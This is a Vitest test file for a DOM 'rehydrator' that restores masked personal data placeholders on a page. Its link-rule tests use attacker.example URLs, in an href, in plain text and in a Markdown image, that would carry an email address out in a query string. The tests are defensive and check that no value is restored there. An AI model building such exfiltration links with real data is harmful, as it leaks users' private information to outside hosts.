// @vitest-environment jsdom
import { beforeEach, describe, expect, it } from "vitest";
import { DomRehydrator } from "./dom";

// Fake values only. [LITERAL_1] holds placeholder-shaped text the user typed.
const MAP = {
  "[PERSON_1]": "Anna Petrova",
  "[EMAIL_1]": "anna@example.org",
  "[LITERAL_1]": "[PERSON_1]",
};

let root: HTMLElement;
let rehydrator: DomRehydrator;

function html(markup: string): HTMLElement {
  root.innerHTML = markup;
  return root;
}

beforeEach(() => {
  document.body.innerHTML = "<main></main>";
  root = document.querySelector("main") as HTMLElement;
  rehydrator = new DomRehydrator(() => MAP);
});

describe("text nodes", () => {
  it("restores a placeholder in place, in the same text node", () => {
    html("<p>Dear [PERSON_1], thanks.</p>");
    const node = root.querySelector("p")?.firstChild;
    const pass = rehydrator.run(root);
    expect(root.textContent).toBe("Dear Anna Petrova, thanks.");
    expect(root.querySelector("p")?.firstChild).toBe(node); // edited, not replaced
    expect(pass.restored).toBe(1);
  });

  it("restores a placeholder split across sibling text nodes", () => {
    const p = document.createElement("p");
    for (const piece of ["Dear [PERS", "ON_", "1], hi"]) p.append(document.createTextNode(piece));
    root.append(p);
    rehydrator.run(root);
    expect(p.textContent).toBe("Dear Anna Petrova, hi");
    expect(p.childNodes).toHaveLength(3); // the site's nodes stay where they were
  });

  it("restores a placeholder split across inline elements", () => {
    html("<p>Dear [PER<strong>SON</strong>_1], hi</p>");
    rehydrator.run(root);
    expect(root.textContent).toBe("Dear Anna Petrova, hi");
    expect(root.querySelector("strong")).not.toBeNull();
  });

  it("leaves an unknown placeholder visible and lists it", () => {
    html("<p>[PERSON_1] and [PERSON_9]</p>");
    const pass = rehydrator.run(root);
    expect(root.textContent).toBe("Anna Petrova and [PERSON_9]");
    expect([...pass.unresolved]).toEqual([["[PERSON_9]", "not_in_mapping"]]);
  });

  it("never touches an attribute", () => {
    html('<p title="[PERSON_1]" data-x="[EMAIL_1]">[PERSON_1]</p>');
    rehydrator.run(root);
    const p = root.querySelector("p");
    expect(p?.getAttribute("title")).toBe("[PERSON_1]");
    expect(p?.getAttribute("data-x")).toBe("[EMAIL_1]");
    expect(p?.textContent).toBe("Anna Petrova");
  });
});

describe("marks, for highlighting without touching the DOM", () => {
  it("gives the text ranges of restored values and of tokens left visible", () => {
    const p = document.createElement("p");
    for (const piece of ["Hi [PERSON_1] and [PERS", "ON_9]."]) p.append(document.createTextNode(piece));
    root.append(p);
    const pass = rehydrator.run(root);
    const shown = pass.marks.map((m) => [m.kind, m.node.data.slice(m.start, m.end)]);
    expect(shown).toEqual([
      ["restored", "Anna Petrova"],
      ["unresolved", "[PERS"],
      ["unresolved", "ON_9]"],
    ]);
  });
});

describe("the link rule (ADR 0003 amendment 1)", () => {
  it("never restores inside an <a>, its text or its href", () => {
    html('<p>Mail <a href="https://attacker.example/?d=[EMAIL_1]">[EMAIL_1]</a> or [PERSON_1]</p>');
    const pass = rehydrator.run(root);
    const a = root.querySelector("a");
    expect(a?.textContent).toBe("[EMAIL_1]");
    expect(a?.getAttribute("href")).toBe("https://attacker.example/?d=[EMAIL_1]");
    expect(root.textContent).toBe("Mail [EMAIL_1] or Anna Petrova");
    expect(pass.unresolved.get("[EMAIL_1]")).toBe("inside_link");
  });

  it("never restores a token that only ends inside an <a>", () => {
    html('<p>x [EMA<a href="/x">IL_1]</a></p>');
    rehydrator.run(root);
    expect(root.textContent).toBe("x [EMAIL_1]");
  });

  it("never restores inside a URL written as text, or Markdown not yet rendered", () => {
    html(
      "<pre>see https://attacker.example/?d=[EMAIL_1] now</pre>" +
        "<p>![s](https://attacker.example/p.png?d=EMAIL_1)</p>",
    );
    const pass = rehydrator.run(root);
    expect(root.textContent).not.toContain("anna@example.org");
    expect(pass.unresolved.get("[EMAIL_1]")).toBe("inside_link");
  });

  it("does not run a URL on into the next block", () => {
    html("<p>see https://example.org/x</p><p>[EMAIL_1]</p>");
    rehydrator.run(root);
    expect(root.querySelectorAll("p")[1]?.textContent).toBe("anna@example.org");
  });
});

describe("what is never rehydrated", () => {
  it("skips the editable textbox, form fields and scripts", () => {
    html(
      '<div contenteditable="true"><p>[PERSON_1]</p></div>' +
        "<textarea>[PERSON_1]</textarea><script>var a = '[PERSON_1]'</script>" +
        '<div role="textbox">[PERSON_1]</div><p>[PERSON_1]</p>',
    );
    rehydrator.run(root);
    expect(root.querySelector("[contenteditable]")?.textContent).toBe("[PERSON_1]");
    expect(root.querySelector("textarea")?.value).toBe("[PERSON_1]");
    expect(root.querySelector("script")?.textContent).toContain("[PERSON_1]");
    expect(root.querySelector("[role=textbox]")?.textContent).toBe("[PERSON_1]");
    expect(root.querySelector(":scope > p")?.textContent).toBe("Anna Petrova");
  });
});

describe("running again", () => {
  it("is idempotent and never rescans a restored value", () => {
    html("<p>You typed [LITERAL_1] for [PERSON_1].</p>");
    rehydrator.run(root);
    rehydrator.run(root);
    expect(root.textContent).toBe("You typed [PERSON_1] for Anna Petrova.");
  });

  it("restores again when the site re-renders the placeholder", () => {
    html("<p>[PERSON_1]</p>");
    rehydrator.run(root);
    const node = root.querySelector("p")?.firstChild as Text;
    node.data = "[PERSON_1] wrote"; // a framework writes its own state back
    rehydrator.run(root);
    expect(root.textContent).toBe("Anna Petrova wrote");
  });

  it("waits for the end of a stream before an unbracketed token at the very end", () => {
    const p = document.createElement("p");
    p.append(document.createTextNode("Call PERSON_1"));
    root.append(p);
    rehydrator.run(root, false);
    expect(p.textContent).toBe("Call PERSON_1"); // the next chunk could make PERSON_12
    p.append(document.createTextNode("2 now"));
    rehydrator.run(root, false);
    expect(p.textContent).toBe("Call PERSON_12 now");
    p.lastChild?.remove();
    rehydrator.run(root, true);
    expect(p.textContent).toBe("Call Anna Petrova");
  });

  it("takes a restored value back when more text changes the token", () => {
    const p = document.createElement("p");
    p.append(document.createTextNode("Call PERSON_1"));
    root.append(p);
    rehydrator.run(root, true);
    expect(p.textContent).toBe("Call Anna Petrova");
    p.append(document.createTextNode("2."));
    rehydrator.run(root, false);
    expect(p.textContent).toBe("Call PERSON_12.");
  });

  it("forgets everything when the map is cleared", () => {
    html("<p>[PERSON_1]</p>");
    let map: Record<string, string> = MAP;
    const live = new DomRehydrator(() => map);
    live.run(root);
    expect(root.textContent).toBe("Anna Petrova");
    map = {};
    live.run(root);
    expect(root.textContent).toBe("[PERSON_1]"); // back to what the site wrote
  });
});
